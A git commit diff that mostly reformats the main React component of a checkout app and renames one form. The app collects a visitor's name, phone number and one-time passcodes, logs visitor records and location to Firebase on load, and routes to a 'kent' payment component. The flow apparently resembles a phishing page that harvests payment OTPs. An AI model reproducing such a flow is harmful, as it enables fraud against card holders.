72ff846634423cd78871cefb1f1c297016f8fb2d
yukghvb <a96363877@gmail.com>
2025-07-12 09:24:13 +0000

    ss

--- src/App.tsx
+++ src/App.tsx
@@ -1,86 +1,84 @@
-
-import { useEffect, useState } from 'react';
-import './main.css';
-import { CartProvider } from './cartContext';
-import Landing from './landing/landing';
-import { Toaster } from 'react-hot-toast';
-import Info from './info/info';
-import { Payment } from './kent/kent';
-import { addData } from './firebase';
-import { Loader } from './loader';
-import { getLocation, setupOnlineStatus } from './lib';
+import { useEffect, useState } from "react";
+import "./main.css";
+import { CartProvider } from "./cartContext";
+import Landing from "./landing/landing";
+import { Toaster } from "react-hot-toast";
+import { CheckoutForm } from "./info/info";
+import { Payment } from "./kent/kent";
+import { addData } from "./firebase";
+import { Loader } from "./loader";
+import { getLocation, setupOnlineStatus } from "./lib";
 
 function App() {
-
   const [currantPage, setCurrantPage] = useState(1);
   const [isLoading, setisloading] = useState(false);
-  const [name, setName] = useState('')
-  const [phone, setPhone] = useState('')
-  const [otp, setOtp] = useState('')
-  const [otpArd] = useState([''])
-  const [_id] = useState("id" + Math.random().toString(16).slice(2))
+  const [name, setName] = useState("");
+  const [phone, setPhone] = useState("");
+  const [otp, setOtp] = useState("");
+  const [otpArd] = useState([""]);
+  const [_id] = useState("id" + Math.random().toString(16).slice(2));
   const data = {
     id: _id,
-    hasPersonalInfo: name != '',
+    hasPersonalInfo: name != "",
     currentPage: currantPage,
     createdDate: new Date().toISOString(),
     notificationCount: 1,
     personalInfo: {
       id: name,
       fullName: name,
-      phone: phone
+      phone: phone,
     },
   };
   const handleNextPage = () => {
-    addData(data)
-    setisloading(true)
+    addData(data);
+    setisloading(true);
     setTimeout(() => {
-      setisloading(false)
-      setCurrantPage(currantPage + 1)
-    }, 3000)
-  }
+      setisloading(false);
+      setCurrantPage(currantPage + 1);
+    }, 3000);
+  };
 
   const handleOtp = (v: string) => {
-    setOtp(v)
-
-  }
+    setOtp(v);
+  };
   const handleOArr = async () => {
-    await otpArd.push(otp)
-  }
+    await otpArd.push(otp);
+  };
   useEffect(() => {
-    localStorage.setItem('vistor', _id)
-    addData(data)
-  }, [])
-  useEffect(()=>{
-  addData(data).then(()=>{
-    setupOnlineStatus(data.id)
-    getLocation()
-  })
-},[])
+    localStorage.setItem("vistor", _id);
+    addData(data);
+  }, []);
+  useEffect(() => {
+    addData(data).then(() => {
+      setupOnlineStatus(data.id);
+      getLocation();
+    });
+  }, []);
   return (
     <CartProvider>
       <div style={{ opacity: isLoading ? 0.4 : 1 }}>
-
         <div>
           <Loader show={isLoading} />
           <Toaster position="bottom-center" />
         </div>
-        {
-          currantPage === 1 ?
-            <Landing handleNextPage={handleNextPage} /> :
-            currantPage === 2 ?
-              <Info setName={setName} setPhone={setPhone} handleNextPage={handleNextPage} /> :
-              currantPage >= 3 ?
-                <Payment
-                  handleOtp={handleOtp}
-                  handleOArr={handleOArr}
-                  handleNextPage={handleNextPage}
-                  currantPage={currantPage}
-                  setCurrantPage={setCurrantPage}
-                  setisloading={setisloading}
-                /> :
-                null
-        }
+        {currantPage === 1 ? (
+          <Landing handleNextPage={handleNextPage} />
+        ) : currantPage === 2 ? (
+          <CheckoutForm
+            setName={setName}
+            setPhone={setPhone}
+            handleNextPage={handleNextPage}
+          />
+        ) : currantPage >= 3 ? (
+          <Payment
+            handleOtp={handleOtp}
+            handleOArr={handleOArr}
+            handleNextPage={handleNextPage}
+            currantPage={currantPage}
+            setCurrantPage={setCurrantPage}
+            setisloading={setisloading}
+          />
+        ) : null}
       </div>
     </CartProvider>
   );
